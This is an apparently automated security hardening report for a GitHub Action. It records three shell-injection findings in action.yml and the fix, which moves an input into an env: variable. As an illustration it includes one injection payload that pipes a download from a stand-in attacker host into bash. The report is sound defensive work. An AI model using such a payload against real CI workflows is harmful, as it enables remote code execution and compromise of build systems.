<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.28

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.28** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The expression `${{ inputs.find-options }}` is interpolated directly inside a `run:` shell command on line 26: `find ${{ inputs.find-options }} -printf "%f"\n | sort -V | jq --slurp`. An attacker who controls the `find-options` input can inject arbitrary shell commands (e.g., `-name x; curl attacker.com | bash #`). The value must be passed via an `env:` variable and double-quoted in the shell instead.

Locations:

- `action.yml:26`

### github-env-injection (severity: high)

The `run:` block writes to `$GITHUB_OUTPUT` (line 28) using a heredoc whose content is produced by `find ${{ inputs.find-options }} ...`. The `inputs.find-options` value is interpolated directly into the shell command without sanitization (`printf '%s' ... | tr -d '\n\r'`), allowing an attacker to influence what is written to GITHUB_OUTPUT by injecting shell metacharacters or newlines into the find-options input.

Locations:

- `action.yml:26`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Moved `${{ inputs.find-options }}` from the inline `run:` shell command into an `env:` block as `FIND_OPTIONS`. Used the xargs-based tokenization idiom to safely split the argument list into a bash array (`find_opts`), with a guard for empty values and NUL-delimited read loop for quote-aware tokenization. The `find` command now expands `"${find_opts[@]}"` safely, preventing shell injection while preserving multi-argument support.

